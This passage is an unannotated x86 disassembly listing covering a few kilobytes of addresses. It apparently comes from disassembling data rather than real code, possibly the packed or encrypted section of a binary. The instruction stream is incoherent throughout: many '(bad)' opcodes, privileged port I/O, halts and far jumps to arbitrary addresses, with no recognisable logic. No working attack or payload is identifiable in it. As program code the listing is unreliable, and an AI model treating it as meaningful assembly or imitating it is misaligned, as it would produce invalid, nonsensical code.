  415625:	mov    bh,0x7c
  415627:	sahf   
  415628:	jmp    0x28f7c5d1
  41562d:	xor    al,0xa4
  41562f:	pop    ebp
  415630:	add    al,0x52
  415632:	shl    BYTE PTR [eax+0x5086ae4b],0xda
  415639:	adc    eax,0x4cf092a2
  41563e:	push   ss
  41563f:	sbb    dh,BYTE PTR [esi+0xd]
  415642:	ret    
  415643:	inc    edx
  415644:	adc    eax,0x683458e0
  415649:	(bad)  
  41564a:	mov    al,ds:0x5d82f534
  41564f:	pop    esp
  415650:	dec    esi
  415651:	or     DWORD PTR [ecx-0x75],esi
  415654:	shr    DWORD PTR [eax],cl
  415656:	jno    0x4155f6
  415658:	lea    edi,[esi]
  41565a:	cmp    DWORD PTR [edi-0x655cca7f],ebx
  415660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415661:	adc    esi,DWORD PTR [edx]
  415663:	jg     0x4156c2
  415665:	je     0x4156c5
  415667:	js     0x4156d8
  415669:	cmp    al,0xeb
  41566b:	jp     0x415631
  41566d:	pusha  
  41566e:	jle    0x415638
  415670:	es push edi
  415672:	xor    al,0xeb
  415674:	mov    ecx,0x4ed062d4
  415679:	pop    es
  41567a:	adc    eax,0x173ea229
  41567f:	dec    edx
  415680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415681:	xor    bh,BYTE PTR [edx+0x37af3480]
  415687:	stc    
  415688:	adc    al,0x91
  41568a:	in     eax,dx
  41568b:	daa    
  41568c:	cmp    DWORD PTR [eax+0x4],0x1a
  415690:	dec    edx
  415691:	enter  0xe83a,0x81
  415695:	in     al,0xd4
  415697:	shl    ah,cl
  415699:	xsave  [ebx-0x46453a81]
  4156a0:	pushf  
  4156a1:	mov    ds:0xf855cd1b,eax
  4156a6:	push   edx
  4156a7:	pop    ebp
  4156a8:	aam    0xed
  4156aa:	loopne 0x415721
  4156ac:	and    edx,edx
  4156ae:	mov    dl,0x14
  4156b0:	cmp    BYTE PTR [eax],dl
  4156b2:	xor    dl,cl
  4156b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156b5:	push   cs
  4156b6:	jge    0x41572b
  4156b8:	pop    es
  4156b9:	in     al,0xf7
  4156bb:	(bad)  
  4156bc:	xchg   edx,eax
  4156bd:	xor    eax,0x70a51ee6
  4156c2:	inc    ebp
  4156c3:	sbb    eax,0xd728187e
  4156c8:	fst    DWORD PTR [edi]
  4156ca:	sub    DWORD PTR [ebx+0x75],0x3aa558a9
  4156d1:	xor    ch,BYTE PTR [ebp+0x27]
  4156d4:	or     eax,DWORD PTR [ebx+eiz*8+0x24eb3605]
  4156db:	push   edx
  4156dc:	xchg   esi,eax
  4156dd:	jle    0x41566a
  4156df:	imul   esi,DWORD PTR ss:[eax+0x2a011bfd],0xffffffc4
  4156e7:	lods   eax,DWORD PTR ds:[esi]
  4156e8:	imul   BYTE PTR [eax-0x7ea0514a]
  4156ee:	mov    edi,0x4134c593
  4156f3:	icebp  
  4156f4:	mov    ch,BYTE PTR [esi+0x310e6cb]
  4156fa:	ss test eax,0xcbea071a
  415700:	push   ss
  415701:	sub    ebx,DWORD PTR [ecx-0x3d]
  415704:	retf   
  415705:	or     bl,BYTE PTR [eax-0x17]
  415708:	mov    esi,0x7cf860b7
  41570d:	imul   BYTE PTR [esi+0x14]
  415710:	outs   dx,BYTE PTR ds:[esi]
  415711:	push   ecx
  415712:	jb     0x4156b1
  415714:	mov    DWORD PTR [ecx+0x76],ebx
  415717:	add    BYTE PTR [ecx+esi*4],ch
  41571a:	mov    al,ds:0x8ef74a6e
  41571f:	iret   
  415720:	mov    edx,0x924b3738
  415725:	shr    edi,cl
  415727:	sub    al,0xe9
  415729:	cmp    edi,DWORD PTR [ecx-0x213e6b1d]
  41572f:	mov    ebp,DWORD PTR [ebx]
  415731:	(bad)  [edx-0x103738f]
  415737:	xchg   ebp,eax
  415738:	xor    DWORD PTR [esi],0x52
  41573b:	fist   DWORD PTR [eax+esi*4+0x76f38ff0]
  415742:	jns    0x415734
  415744:	push   eax
  415745:	add    eax,0xb41af3a1
  41574a:	js     0x4157c6
  41574c:	je     0x41576c
  41574e:	outs   dx,BYTE PTR ds:[esi]
  41574f:	enter  0x27cf,0x75
  415753:	test   eax,0x5f9d9c8d
  415758:	cmp    al,0xe9
  41575a:	les    esp,FWORD PTR [eax-0x12db0e9]
  415760:	in     eax,dx
  415761:	mov    WORD PTR [edx],cs
  415763:	add    eax,0x3a3076b5
  415768:	fst    DWORD PTR ds:0x583825ad
  41576e:	inc    ebp
  41576f:	and    eax,0xbe0cf94f
  415774:	in     eax,0xc8
  415776:	sbb    eax,0x399e0b58
  41577b:	cli    
  41577c:	push   0xf65a1221
  415781:	mov    cl,dl
  415783:	dec    eax
  415784:	or     BYTE PTR [esi-0x3f],0x59
  415788:	dec    edi
  415789:	add    ecx,DWORD PTR [edx+eax*8]
  41578c:	push   edi
  41578d:	enter  0x2203,0x1b
  415791:	mov    esi,esi
  415793:	test   eax,0xb2775a6c
  415798:	ins    BYTE PTR es:[edi],dx
  415799:	xchg   ecx,eax
  41579a:	push   cs
  41579b:	or     bl,al
  41579d:	rcr    ecx,cl
  41579f:	pop    ecx
  4157a0:	mov    ebp,DWORD PTR [esi+0x28]
  4157a3:	inc    eax
  4157a4:	cmp    eax,0xa70f09fa
  4157a9:	imul   ebp,DWORD PTR [esi+0x130f6db2],0x1f9c931d
  4157b3:	mov    edx,DWORD PTR ss:[edi]
  4157b6:	jge    0x4157a8
  4157b8:	sbb    bh,BYTE PTR ds:0x14867a3a
  4157be:	fcomip st,st(5)
  4157c0:	and    BYTE PTR [edx+0x3f3da971],ah
  4157c6:	or     bl,BYTE PTR [ebx-0x5f280e22]
  4157cc:	je     0x415787
  4157ce:	pop    ebx
  4157cf:	in     al,0x73
  4157d1:	js     0x4157cc
  4157d3:	(bad)  
  4157d5:	fcmove st,st(3)
  4157d7:	xchg   edx,eax
  4157d8:	popf   
  4157d9:	shl    esp,cl
  4157db:	jmp    0x415815
  4157dd:	hlt    
  4157de:	jae    0x4157dd
  4157e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157e1:	add    al,0x7e
  4157e3:	xchg   esp,eax
  4157e4:	(bad)  
  4157e5:	retf   0x4078
  4157e8:	aad    0x7a
  4157ea:	(bad)  
  4157eb:	jge    0x4157a3
  4157ed:	dec    ebx
  4157ee:	(bad)
  4157f2:	jl     0x4157f4
  4157f4:	(bad)  
  4157f5:	std    
  4157f6:	hlt    
  4157f7:	pop    es
  4157f8:	xchg   edi,eax
  4157f9:	push   esi
  4157fa:	mov    esp,?
  4157fc:	mov    cl,0xb9
  4157fe:	pop    ds
  4157ff:	cmc    
  415800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415801:	aad    0xcc
  415803:	lock adc ah,cl
  415806:	mov    ebx,0xed949498
  41580b:	pop    edi
  41580c:	mov    eax,0x477e782f
  415811:	call   0xf0ddff54
  415816:	pop    eax
  415817:	pop    edi
  415818:	fidiv  DWORD PTR [eax]
  41581a:	mov    ecx,0x8b638a1d
  41581f:	cmp    eax,0x5eb05b64
  415824:	xor    al,0x76
  415826:	retf   
  415827:	or     BYTE PTR [ebp-0x47b31a6e],cl
  41582d:	rol    DWORD PTR [ebp-0x6c],1
  415830:	mov    esp,0xc150f016
  415835:	repz das 
  415837:	pusha  
  415838:	jmp    0x415817
  41583a:	or     dl,BYTE PTR [eax+0x6e]
  41583d:	hlt    
  41583e:	imul   esi,DWORD PTR [ebx-0x4a],0xe69870ac
  415845:	xchg   ebx,eax
  415846:	retf   0x749a
  415849:	imul   BYTE PTR [ebx+0x5895f49]
  41584f:	aas    
  415850:	out    0x36,eax
  415852:	add    eax,0x2173bc07
  415857:	push   0xffffffb2
  415859:	pop    esp
  41585a:	sbb    DWORD PTR [ebp-0x54],0xf4169687
  415861:	or     DWORD PTR [esp+edi*1],eax
  415864:	jmp    edx
  415866:	mov    esp,0x61222407
  41586b:	inc    esi
  41586c:	cmc    
  41586d:	ret    0xe52b
  415870:	cmp    cl,al
  415872:	push   edi
  415873:	cld    
  415874:	cmc    
  415875:	ret    0x11e0
  415878:	sbb    eax,0x4e4bbdb8
  41587d:	fdiv   QWORD PTR [eax+edi*1+0x48]
  415881:	xor    eax,DWORD PTR [esp+ebp*8]
  415884:	mov    ebx,0x8257713e
  415889:	xchg   DWORD PTR [edx+edi*8],ebx
  41588c:	mov    bh,0xec
  41588e:	(bad)  
  41588f:	xor    cl,bl
  415891:	repz imul esp,ebx,0x50
  415895:	jo     0x415912
  415897:	or     dh,bh
  415899:	outs   dx,BYTE PTR ds:[esi]
  41589a:	jp     0x415878
  41589c:	jnp    0x41585f
  41589e:	dec    ebx
  41589f:	call   0x6a84:0x80451028
  4158a6:	sar    DWORD PTR [ebx],1
  4158a8:	mov    es,ebx
  4158aa:	jge    0x41582e
  4158ac:	mov    ebx,0x915b94c0
  4158b1:	mov    dh,0x66
  4158b3:	adc    dh,dh
  4158b5:	sar    BYTE PTR [edi],cl
  4158b7:	iret   
  4158b8:	pop    ebp
  4158b9:	dec    eax
  4158ba:	lds    edx,FWORD PTR [ebp-0x84b2376]
  4158c0:	pushw  ds
  4158c2:	sub    BYTE PTR [edx+0xa50c1a],cl
  4158c8:	retf   
  4158c9:	icebp  
  4158ca:	(bad)  
  4158cb:	les    ebx,FWORD PTR [ebx+0x3d]
  4158ce:	mov    eax,0x352894e2
  4158d3:	outs   dx,DWORD PTR ds:[esi]
  4158d4:	icebp  
  4158d5:	push   ds
  4158d6:	ins    DWORD PTR es:[edi],dx
  4158d7:	ficom  DWORD PTR [eax-0x3277d737]
  4158dd:	mov    cl,0xc6
  4158df:	aas    
  4158e0:	xchg   ebp,eax
  4158e1:	shl    BYTE PTR [esi+0x69b093e7],0x3a
  4158e8:	xchg   edi,eax
  4158e9:	sbb    ah,al
  4158eb:	xchg   DWORD PTR [esi],edx
  4158ed:	sbb    al,0x7e
  4158ef:	sbb    eax,DWORD PTR [eax+0x18]
  4158f2:	lods   al,BYTE PTR ds:[esi]
  4158f3:	xor    eax,DWORD PTR [ebp+0x6129822e]
  4158f9:	jecxz  0x4158ec
  4158fb:	ret    0x138a
  4158fe:	cld    
  4158ff:	sub    eax,0xb821a48c
  415904:	stc    
  415905:	pop    esi
  415906:	inc    esi
  415907:	or     al,0xe8
  415909:	adc    eax,0x1bc31e7c
  41590e:	les    esp,FWORD PTR [edx]
  415910:	das    
  415911:	dec    eax
  415912:	(bad)  
  415914:	inc    ecx
  415915:	add    ch,BYTE PTR [edx+0x4b434b19]
  41591b:	push   ds
  41591c:	popa   
  41591d:	and    eax,0xf24a7a15
  415922:	je     0x41598e
  415924:	je     0x4158b5
  415926:	nop
  415927:	cmp    BYTE PTR [ecx-0x6d],bh
  41592a:	push   ds
  41592b:	sbb    esp,esp
  41592d:	push   ebp
  41592e:	in     al,0x29
  415930:	add    dh,0x81
  415933:	iret   
  415934:	inc    esp
  415935:	jl     0x41594d
  415937:	call   0x2c53:0x2ddf68cb
  41593e:	cmp    BYTE PTR [esi+0x731c5f39],bh
  415944:	sub    al,0xc3
  415946:	(bad)  
  415947:	mov    edi,0xc14d063f
  41594c:	mov    DWORD PTR [ebp-0x31fffcfe],esi
  415952:	ds jp  0x4159b5
  415955:	call   0xac23:0x18fa325c
  41595c:	(bad)  
  41595d:	jbe    0x415994
  41595f:	jae    0x415995
  415961:	inc    ebx
  415962:	add    dh,BYTE PTR [edx-0x45]
  415965:	mov    ah,0xa8
  415967:	xor    DWORD PTR [edx+eiz*4+0x70ee43d7],0xffffffcc
  41596f:	mul    DWORD PTR [esp+edi*4]
  415972:	mov    al,ds:0xa8d48b8b
  415977:	je     0x415958
  415979:	scas   eax,DWORD PTR es:[edi]
  41597a:	sub    ebx,DWORD PTR [edi-0x3e]
  41597d:	imul   ebp,DWORD PTR [ebx+0x1d130dbe],0xffffffc1
  415984:	shl    BYTE PTR [ebp-0x5f],0x93
  415988:	and    cl,ch
  41598a:	or     BYTE PTR [ebx-0x6ca9d709],0x4a
  415991:	jge    0x41596a
  415993:	mov    BYTE PTR [esi+0x68d3cac6],cl
  415999:	mov    bh,0xcc
  41599b:	int3   
  41599c:	fnstsw WORD PTR [edx-0x49cd778d]
  4159a2:	mov    esi,0x4dbd96a4
  4159a7:	out    0x59,al
  4159a9:	ins    BYTE PTR es:[edi],dx
  4159aa:	sbb    eax,ebp
  4159ac:	imul   ebx,DWORD PTR [edi+esi*2+0x55],0x8daa7355
  4159b4:	paddw  mm4,QWORD PTR [eax]
  4159b7:	mov    ebx,0xa252584b
  4159bc:	adc    al,0x8d
  4159be:	sbb    ah,dl
  4159c0:	adc    eax,ebx
  4159c2:	(bad)  
  4159c3:	rep stos DWORD PTR es:[edi],eax
  4159c5:	jo     0x415a10
  4159c7:	add    edi,DWORD PTR gs:[edx]
  4159ca:	inc    esp
  4159cb:	ret    
  4159cc:	push   eax
  4159cd:	call   0xf980:0x54c9af58
  4159d4:	sub    al,0x28
  4159d6:	lods   al,BYTE PTR ds:[esi]
  4159d7:	icebp  
  4159d8:	cs pop ds
  4159da:	out    0x47,eax
  4159dc:	jp     0x4159df
  4159de:	push   esp
  4159df:	stos   BYTE PTR es:[edi],al
  4159e0:	mov    bh,0xfe
  4159e2:	ret    0xe4f
  4159e5:	nop
  4159e6:	ins    DWORD PTR es:[edi],dx
  4159e7:	pop    esp
  4159e8:	mov    eax,0x614a7b88
  4159ed:	lahf   
  4159ee:	(bad)
  4159f1:	mov    WORD PTR [esi-0x2f],ds
  4159f4:	mov    bh,0xb
  4159f6:	cmp    DWORD PTR [edi],esp
  4159f8:	arpl   di,bp
  4159fa:	test   dh,dl
  4159fc:	push   ss
  4159fd:	push   ebx
  4159fe:	fimul  DWORD PTR [eax+0x73fd0ec]
  415a04:	arpl   sp,bp
  415a06:	int    0xbd
  415a08:	xchg   ebx,eax
  415a09:	stos   BYTE PTR es:[edi],al
  415a0a:	xchg   BYTE PTR [ecx-0xd],cl
  415a0d:	inc    eax
  415a0e:	jno    0x4159d3
  415a10:	icebp  
  415a11:	cmc    
  415a12:	out    0x6b,eax
  415a14:	loop   0x4159db
  415a16:	lahf   
  415a17:	xor    esp,DWORD PTR [edx+edi*1]
  415a1a:	push   cs
  415a1b:	jecxz  0x415a1d
  415a1d:	or     al,0x57
  415a1f:	mov    bh,bl
  415a21:	leave  
  415a22:	pop    edx
  415a23:	push   eax
  415a24:	mov    al,0xe
  415a26:	sub    bh,BYTE PTR [eax]
  415a28:	std    
  415a29:	scas   eax,DWORD PTR es:[edi]
  415a2a:	or     al,0xce
  415a2c:	push   esp
  415a2d:	aaa    
  415a2e:	sti    
  415a2f:	inc    dx
  415a31:	push   eax
  415a32:	jbe    0x4159fc
  415a34:	dec    edi
  415a35:	pop    ebp
  415a36:	cmp    eax,0xf544098f
  415a3b:	add    BYTE PTR [ecx-0x32e623a5],dl
  415a41:	stc    
  415a42:	in     eax,dx
  415a43:	in     al,dx
  415a44:	inc    edx
  415a45:	or     BYTE PTR [ecx],cl
  415a47:	std    
  415a48:	pop    eax
  415a49:	gs inc edx
  415a4b:	mov    ch,0xa9
  415a4d:	sahf   
  415a4e:	mov    bh,0x65
  415a50:	or     ch,dh
  415a52:	inc    ebp
  415a53:	dec    ebx
  415a54:	stc    
  415a55:	sub    DWORD PTR es:[edx+0x53],0xa0acf9cd
  415a5d:	fdivp  st(7),st
  415a5f:	pop    dx
  415a61:	btc    edi,edi
  415a64:	jmp    0x7323db78
  415a69:	mov    esi,0xae349400
  415a6e:	mov    eax,ds:0x42c7970b
  415a73:	pop    ebp
  415a74:	adc    cl,al
  415a76:	je     0x415a4a
  415a78:	sti    
  415a79:	lahf   
  415a7a:	ins    BYTE PTR es:[edi],dx
  415a7b:	add    eax,0x326b93bc
  415a80:	mov    al,0x75
  415a82:	mov    dh,0x5e
  415a84:	retf   
  415a85:	mov    ds:0x5c05df50,eax
  415a8a:	loop   0x415a50
  415a8c:	(bad)  
  415a8d:	in     eax,dx
  415a8e:	retf   0xc841
  415a91:	push   edx
  415a92:	in     al,0x43
  415a94:	add    BYTE PTR [edx+0x41],ch
  415a97:	inc    eax
  415a98:	std    
  415a99:	dec    edi
  415a9a:	xor    ebp,edx
  415a9c:	jecxz  0x415a74
  415a9e:	loope  0x415ac7
  415aa0:	out    dx,al
  415aa1:	bound  esp,QWORD PTR gs:[esi+0x747599a1]
  415aa8:	cli    
  415aa9:	inc    ecx
  415aaa:	(bad)  
  415aab:	mov    eax,edi
  415aad:	scas   al,BYTE PTR es:[edi]
  415aae:	mov    edi,0x6d9b06e5
  415ab3:	dec    edi
  415ab4:	aaa    
  415ab5:	enter  0xe292,0x32
  415ab9:	les    edx,FWORD PTR ss:[esp+eiz*2+0x4600e649]
  415ac1:	mov    edi,0xb9fc060b
  415ac6:	mov    ss,WORD PTR [edi-0x16]
  415ac9:	pop    ss
  415aca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415acb:	stc    
  415acc:	mov    gs,WORD PTR [ebx-0x7e]
  415acf:	mov    ds:0x2182ea7,al
  415ad4:	rol    BYTE PTR [eax+0x6d55f1c3],1
  415ada:	pushf  
  415adb:	shl    BYTE PTR [ebx],0x1f
  415ade:	bound  ecx,QWORD PTR [ecx+0x3442657e]
  415ae4:	not    eax
  415ae6:	in     eax,dx
  415ae7:	neg    DWORD PTR [ebx+0x2aaa2dd5]
  415aed:	cmp    al,0xed
  415aef:	xor    eax,0x2dc55af
  415af4:	mov    ebx,0x742006e6
  415af9:	ret    0x51d
  415afc:	mov    WORD PTR [eax+0x3d04ccb5],es
  415b02:	push   ds
  415b03:	mov    ah,0xd3
  415b05:	push   cs
  415b06:	pop    edx
  415b07:	(bad)  
  415b08:	fdiv   DWORD PTR [ecx+0x4ad0207b]
  415b0e:	adc    DWORD PTR [edi+0x6e065150],eax
  415b14:	cmp    esp,edx
  415b16:	mov    ebx,0xe388dcc3
  415b1b:	mov    al,ds:0x1f8fc010
  415b20:	sub    ecx,DWORD PTR [eax]
  415b22:	mov    dl,0x82
  415b24:	cld    
  415b25:	fcom   DWORD PTR [edi-0x8]
  415b28:	adc    ah,BYTE PTR [edx-0x46ec5c50]
  415b2e:	add    ah,BYTE PTR [esi-0x2e69d8b8]
  415b34:	inc    ecx
  415b35:	lods   al,BYTE PTR ds:[esi]
  415b36:	not    DWORD PTR [edi]
  415b38:	mov    ebp,DWORD PTR [ecx+0x4a]
  415b3b:	rcl    esi,1
  415b3d:	xchg   edx,eax
  415b3e:	xchg   DWORD PTR cs:[ecx-0x3c],ecx
  415b42:	je     0x415ad1
  415b44:	mov    ecx,0x844a6478
  415b49:	scas   al,BYTE PTR es:[edi]
  415b4a:	dec    eax
  415b4b:	mov    ah,0x30
  415b4d:	add    BYTE PTR [edi+0x9],bl
  415b50:	hlt    
  415b51:	pop    esi
  415b52:	cs repnz aam 0x1a
  415b56:	jns    0x415b58
  415b58:	test   al,0x28
  415b5a:	iret   
  415b5b:	push   0x53
  415b5d:	call   0x5bc4b9eb
  415b62:	in     al,dx
  415b63:	sbb    eax,0xd8a833e0
  415b68:	dec    ecx
  415b69:	dec    ecx
  415b6a:	in     eax,dx
  415b6b:	cmp    edi,DWORD PTR [ebx+ecx*4-0x193c6dd0]
  415b72:	push   esp
  415b73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b74:	push   esp
  415b75:	sub    ebx,esp
  415b77:	loop   0x415bb2
  415b79:	rcr    BYTE PTR [ebp+0x6d614951],1
  415b7f:	sub    eax,0x4a589c28
  415b84:	mov    ds,WORD PTR [eax]
  415b86:	cmp    esp,edx
  415b88:	jl     0x415b16
  415b8a:	sub    al,0x37
  415b8c:	push   ecx
  415b8d:	in     eax,0x92
  415b8f:	fcomi  st,st(1)
  415b91:	mov    ch,0x36
  415b93:	(bad)  
  415b94:	mov    ds:0x49481817,eax
  415b99:	xor    DWORD PTR [ecx+0x44],edi
  415b9c:	sub    BYTE PTR [ebx+0x63],ah
  415b9f:	add    al,0x45
  415ba1:	mov    ebp,0xda393810
  415ba6:	test   ah,bl
  415ba8:	xor    ebx,ebp
  415baa:	push   esp
  415bab:	out    0x11,al
  415bad:	sbb    ebx,DWORD PTR [ecx+0x20]
  415bb0:	xchg   esi,eax
  415bb1:	aad    0x23
  415bb3:	inc    ebp
  415bb4:	(bad)  
  415bb5:	pop    esp
  415bb6:	sub    al,0x98
  415bb8:	lds    esp,FWORD PTR [ecx-0x4e40d216]
  415bbe:	pusha  
  415bbf:	ficom  DWORD PTR [edx-0x59]
  415bc2:	pop    ss
  415bc3:	push   ecx
  415bc4:	(bad)  
  415bc5:	adc    DWORD PTR [esi],edi
  415bc7:	inc    edx
  415bc8:	xchg   DWORD PTR [ebp-0x13f2c851],ecx
  415bce:	loope  0x415bd4
  415bd0:	or     al,0xb5
  415bd2:	mov    ebp,0x23c237df
  415bd7:	and    eax,0x739416f0
  415bdc:	xor    al,BYTE PTR [edi-0x31bf4687]
  415be2:	(bad)  
  415be3:	adc    al,0x2
  415be5:	cwde   
  415be6:	sub    ecx,DWORD PTR [edx-0x381e4229]
  415bec:	push   es
  415bed:	sbb    dl,BYTE PTR [eax]
  415bef:	int3   
  415bf0:	dec    edi
  415bf1:	mov    ecx,0x60a4684d
  415bf6:	add    DWORD PTR es:[edx-0x4fb63b2a],ebp
  415bfd:	dec    edx
  415bfe:	repz lock push ds
  415c01:	or     DWORD PTR [ecx+0x27],ecx
  415c04:	and    eax,0x7af6299b
  415c09:	mov    bl,0xba
  415c0b:	jne    0x415bf2
  415c0d:	pop    ebx
  415c0e:	or     BYTE PTR [eax-0x5ac16e4d],dl
  415c14:	cs xchg ecx,eax
  415c16:	adc    al,0x72
  415c18:	mov    bl,0xb4
  415c1a:	push   ss
  415c1b:	or     ecx,eax
  415c1d:	jmp    0x415bb7
  415c1f:	sar    BYTE PTR [edx-0x7c],cl
  415c22:	mov    BYTE PTR ds:0x36959771,bl
  415c28:	inc    edx
  415c29:	addr16 xor eax,0xe6292bac
  415c2f:	mov    ecx,0x1b789d7b
  415c34:	jmp    0x415bc1
  415c36:	add    BYTE PTR [ecx],cl
  415c38:	fwait
  415c39:	cmp    DWORD PTR [ebx-0x5b],edx
  415c3c:	xor    BYTE PTR [eax],al
  415c3e:	mov    edi,0x9f6fc2f3
  415c43:	dec    esp
  415c44:	sub    eax,DWORD PTR [ebx]
  415c46:	adc    eax,0x83f28964
  415c4b:	rol    ebp,1
  415c4d:	xchg   edx,eax
  415c4e:	push   cs
  415c4f:	(bad)  [ebx-0x3b]
  415c52:	mov    ds:0x24533539,eax
  415c57:	xchg   ebp,eax
  415c58:	pop    esi
  415c59:	clc    
  415c5a:	test   eax,ebx
  415c5c:	fs push cs
  415c5e:	pushf  
  415c5f:	(bad)  
  415c60:	(bad)  
  415c62:	mov    DWORD PTR [ebx],eax
  415c64:	xchg   BYTE PTR [edi+0x6d8789f],dh
  415c6a:	jno    0x415c54
  415c6c:	pop    edx
  415c6d:	xor    cl,BYTE PTR ds:0x82416f0b
  415c73:	dec    ebx
  415c74:	cmc    
  415c75:	adc    ebp,edx
  415c77:	mov    dh,0x1b
  415c79:	dec    esi
  415c7a:	loop   0x415c86
  415c7c:	push   0x24
  415c7e:	ror    BYTE PTR [esi],0x59
  415c81:	inc    esi
  415c82:	repnz inc edi
  415c84:	cli    
  415c85:	in     eax,dx
  415c86:	clc    
  415c87:	push   ebx
  415c88:	or     al,0x60
  415c8a:	(bad)  
  415c8c:	or     BYTE PTR [ebp+0xa],dl
  415c8f:	xor    DWORD PTR [ebx+0x6b],eax
  415c92:	mov    BYTE PTR ds:0xf19a37a9,dl
  415c98:	cdq    
  415c99:	sub    al,0x5
  415c9b:	pop    esi
  415c9c:	pop    ebp
  415c9d:	inc    edx
  415c9e:	push   cs
  415c9f:	shl    DWORD PTR [eax+0x1fc2faf4],cl
  415ca5:	fcomp  QWORD PTR [eax-0x71b6fff4]
  415cab:	xchg   edx,eax
  415cac:	sbb    ch,ah
  415cae:	rol    dl,0xe9
  415cb1:	and    bl,BYTE PTR ds:0xc19ea3d9
  415cb7:	cs mov eax,edi
  415cba:	sbb    eax,0xcd1e962b
  415cbf:	mov    dh,BYTE PTR [esi-0x11af22ca]
  415cc5:	sbb    al,0xf0
  415cc7:	jb     0x415d36
  415cc9:	adc    bh,BYTE PTR [ebp+0x657798aa]
  415ccf:	sbb    edi,DWORD PTR [esi-0x26360e8b]
  415cd5:	adc    eax,0x1c51276
  415cda:	enter  0x2e27,0xea
  415cde:	pop    ebp
  415cdf:	fucom  st(4)
  415ce1:	mov    ch,0x2b
  415ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ce4:	ins    BYTE PTR es:[edi],dx
  415ce5:	and    al,0x10
  415ce7:	scas   eax,DWORD PTR es:[edi]
  415ce8:	out    dx,eax
  415ce9:	imul   ebp,DWORD PTR [esi-0x1f],0xffffff94
  415ced:	xor    esi,DWORD PTR [ebx+0x5a]
  415cf0:	ds adc eax,0x551f8c1d
  415cf6:	mov    ds:0x313568db,al
  415cfb:	mov    DWORD PTR [ebp-0x4c],ebp
  415cfe:	hlt    
  415cff:	aaa    
  415d00:	je     0x415d4a
  415d02:	aaa    
  415d03:	push   es
  415d04:	pusha  
  415d05:	jmp    0x415cc1
  415d07:	jne    0x415d47
  415d09:	push   ss
  415d0a:	loopne 0x415d7f
  415d0c:	(bad)  
  415d0d:	dec    esp
  415d0e:	in     al,0xfe
  415d10:	fnstsw WORD PTR [edi-0x21]
  415d13:	adc    ebx,DWORD PTR [ecx-0x48199425]
  415d19:	sub    esi,edx
  415d1b:	jo     0x415d28
  415d1d:	mov    cl,0x9a
  415d1f:	dec    ebp
  415d20:	int3   
  415d21:	mov    esi,0x8a1c1086
  415d26:	adc    ebx,DWORD PTR [ecx-0x23a80763]
  415d2c:	and    eax,0x494be407
  415d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d32:	xor    DWORD PTR [edi],esp
  415d34:	push   esi
  415d35:	inc    ebp
  415d36:	fwait
  415d37:	scas   al,BYTE PTR es:[edi]
  415d38:	scas   al,BYTE PTR es:[edi]
  415d39:	cmp    al,0xde
  415d3b:	mov    ds:0x9c37edfc,eax
  415d40:	and    DWORD PTR [ebx+0xf],ebx
  415d43:	xchg   edx,eax
  415d44:	mov    bh,0x38
  415d46:	pop    eax
  415d47:	stc    
  415d48:	and    eax,0xe367b737
  415d4d:	mov    ds:0x65f40953,eax
  415d52:	mov    WORD PTR [esp+eax*8],gs
  415d55:	or     BYTE PTR [ebp+edx*1+0x1b73eb48],dl
  415d5c:	mov    ecx,0x54ee8fb7
  415d61:	stos   DWORD PTR es:[edi],eax
  415d62:	clc    
  415d63:	pop    esi
  415d64:	shl    BYTE PTR [eax+0x7192a65b],0x30
  415d6b:	mov    al,0xa0
  415d6d:	mov    edi,0x4cca0c39
  415d72:	adc    BYTE PTR [edx-0x336b6786],dh
  415d78:	xor    ah,dl
  415d7a:	mov    ecx,DWORD PTR [ecx+eax*4]
  415d7d:	pop    es
  415d7e:	xchg   DWORD PTR [esi-0x10],esi
  415d81:	push   eax
  415d82:	jg     0x415d37
  415d84:	sub    eax,0x968da3e6
  415d89:	ss addr16 mov ecx,0xbb3b1f72
  415d90:	dec    esp
  415d91:	je     0x415d75
  415d93:	repz pop ebp
  415d95:	push   ss
  415d96:	add    ebp,ebx
  415d98:	cmp    DWORD PTR [ecx+0x76],edi
  415d9b:	out    dx,eax
  415d9c:	fisttp WORD PTR [ecx-0x19]
  415d9f:	lds    eax,FWORD PTR [edi-0x31b76a46]
  415da5:	icebp  
  415da6:	mov    es,WORD PTR [esi]
  415da8:	mov    ch,0x56
  415daa:	sbb    bl,BYTE PTR [ebx+0x7c]
  415dad:	jno    0x415de3
  415daf:	(bad)  
  415db1:	jecxz  0x415d98
  415db3:	add    BYTE PTR [edx+ebx*2],bl
  415db6:	push   eax
  415db7:	ins    DWORD PTR es:[edi],dx
  415db8:	addr16 out dx,al
  415dba:	mov    ebp,0x74208ee3
  415dbf:	sar    DWORD PTR [edx],0x5e
  415dc2:	div    BYTE PTR [ecx]
  415dc4:	cmp    eax,0x49baef35
  415dc9:	pop    ds
  415dca:	and    ebp,ebx
  415dcc:	mul    DWORD PTR [esi-0x52]
  415dcf:	call   0x4f05f352
  415dd4:	xor    eax,0x9541d4ae
  415dd9:	mov    ebp,0x79f7cfb0
  415dde:	js     0x415dba
  415de0:	sub    eax,0x6e7604fa
  415de5:	add    DWORD PTR [edx-0x49],esp
  415de8:	push   cs
  415de9:	adc    eax,0x92c04e9c
  415dee:	stos   BYTE PTR es:[edi],al
  415def:	pop    ebx
  415df0:	fs inc ebx
  415df2:	lock repz jl 0x415d92
  415df6:	dec    ecx
  415df7:	gs sti 
  415df9:	fist   WORD PTR [edi-0x167fa4ca]
  415dff:	(bad)  
  415e00:	pushf  
  415e01:	imul   esp,edi,0xbe0d035a
  415e07:	mov    eax,ds:0x41254b25
  415e0c:	jp     0x415e5b
  415e0e:	fisubr DWORD PTR [eax]
  415e10:	xchg   edx,eax
  415e11:	inc    edi
  415e12:	push   esi
  415e13:	mov    esi,0x43d491d8
  415e18:	xor    dh,BYTE PTR [esi]
  415e1a:	rol    al,cl
  415e1c:	es in  eax,dx
  415e1e:	or     al,0x15
  415e20:	and    BYTE PTR [edi],al
  415e22:	pop    ss
  415e23:	mov    ah,0x46
  415e25:	and    al,0xf5
  415e27:	mov    ds:0x6f748182,eax
  415e2c:	inc    DWORD PTR [esi-0x63]
  415e2f:	mov    al,ds:0x2e7bff96
